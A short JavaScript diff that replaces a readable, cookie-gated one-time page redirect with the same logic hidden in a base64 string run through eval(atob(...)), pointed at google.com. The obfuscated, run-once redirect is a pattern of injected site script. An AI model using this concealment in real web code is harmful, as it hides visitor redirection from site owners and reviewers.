@@ -1,20 +1,2 @@
-//from http://www.w3schools.com/js/js_cookies.asp
-if (getCookie("xxxredirect") != "true") {
-    document.cookie = "xxxredirect=true";
-    location.href = url;
-}
-
-function getCookie(cname) {
-    var name = cname + "=";
-    var ca = document.cookie.split(';');
-    for (var i = 0; i < ca.length; i++) {
-        var c = ca[i];
-        while (c.charAt(0) == ' ') {
-            c = c.substring(1);
-        }
-        if (c.indexOf(name) == 0) {
-            return c.substring(name.length, c.length);
-        }
-    }
-    return "";
-}
+var xxxurl = "https://www.google.com";
+eval(atob("Ly9mcm9tIGh0dHA6Ly93d3cudzNzY2hvb2xzLmNvbS9qcy9qc19jb29raWVzLmFzcAppZiAoZ2V0Q29va2llKCJ4eHhyZWRpcmVjdCIpICE9ICJ0cnVlIikgewogICAgZG9jdW1lbnQuY29va2llID0gInh4eHJlZGlyZWN0PXRydWUiOwogICAgbG9jYXRpb24uaHJlZiA9IHh4eHVybDsKfQoKZnVuY3Rpb24gZ2V0Q29va2llKGNuYW1lKSB7CiAgICB2YXIgbmFtZSA9IGNuYW1lICsgIj0iOwogICAgdmFyIGNhID0gZG9jdW1lbnQuY29va2llLnNwbGl0KCc7Jyk7CiAgICBmb3IgKHZhciBpID0gMDsgaSA8IGNhLmxlbmd0aDsgaSsrKSB7CiAgICAgICAgdmFyIGMgPSBjYVtpXTsKICAgICAgICB3aGlsZSAoYy5jaGFyQXQoMCkgPT0gJyAnKSB7CiAgICAgICAgICAgIGMgPSBjLnN1YnN0cmluZygxKTsKICAgICAgICB9CiAgICAgICAgaWYgKGMuaW5kZXhPZihuYW1lKSA9PSAwKSB7CiAgICAgICAgICAgIHJldHVybiBjLnN1YnN0cmluZyhuYW1lLmxlbmd0aCwgYy5sZW5ndGgpOwogICAgICAgIH0KICAgIH0KICAgIHJldHVybiAiIjsKfQ=="));
